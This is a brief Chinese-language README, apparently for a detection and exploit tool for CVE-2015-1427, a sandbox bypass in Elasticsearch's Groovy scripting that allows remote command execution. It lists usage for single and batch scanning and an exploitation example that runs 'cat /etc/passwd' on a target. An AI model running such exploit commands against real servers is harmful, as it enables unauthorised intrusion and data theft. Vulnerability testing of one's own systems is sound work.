Elasticsearch在版本1.3.8之前及版本1.4.x在1.4.3之前的Groovy脚本引擎存在漏洞，远程攻击者可通过精心构造的脚本绕过沙箱保护机制并执行任意shell命令。

单个检测：python3 .\CVE-2015-1427-POC.py -t "http://0.0.0.0:1234/"
批量检测：python3 .\CVE-2015-1427-POC -f "url.txt"
漏洞利用：./CVE-2015-1427-EXP.* -t URL(http://x.x.x.x/) -c command(cat /etc/passwd) 
